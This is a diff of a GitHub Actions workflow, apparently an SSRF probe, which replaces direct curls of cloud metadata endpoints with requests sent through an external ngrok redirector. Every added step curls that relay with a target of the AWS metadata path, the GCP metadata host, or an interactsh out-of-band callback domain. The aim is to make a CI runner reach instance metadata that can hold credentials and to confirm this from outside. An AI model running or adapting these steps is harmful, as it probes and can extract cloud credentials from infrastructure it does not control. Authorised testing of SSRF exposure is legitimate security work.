@@ -1,20 +1,24 @@
-name: SSRF-Test
+name: SSRF Scanner
 
 on:
   workflow_dispatch:
 
 jobs:
-  ssrf:
+  ssrf-test:
     runs-on: ubuntu-latest
     steps:
-      - name: Curling AWS metadata
-        run: curl http://169.254.169.254/latest/meta-data/
-      
-      - name: Curling GCP metadata
-        run: curl http://metadata.google.internal
-      
-      - name: Curling Localhost
-        run: ping -c 2 127.0.0.1
+      - name: Curl to AWS Metadata via Flask Redirect
+        run: |
+          curl -v "https://cd13e3febd7f.ngrok-free.app/meta?target=http://169.254.169.254/latest/meta-data/"
 
-      - name: Curling Ngrok
-        run: curl https://cd13e3febd7f.ngrok-free.app
+      - name: Curl to GCP Metadata via Flask Redirect
+        run: |
+          curl -v "https://cd13e3febd7f.ngrok-free.app/meta?target=http://metadata.google.internal"
+
+      - name: Curl to Interactsh via Flask Redirect
+        run: |
+          curl -v "https://cd13e3febd7f.ngrok-free.app/meta?target=https://d2anq5a9io6mpv2l55g0wxshdz9mzn8k4.oast.me"
+
+      - name: Direct Ping to Flask /ping endpoint
+        run: |
+          curl -v "https://cd13e3febd7f.ngrok-free.app/ping"
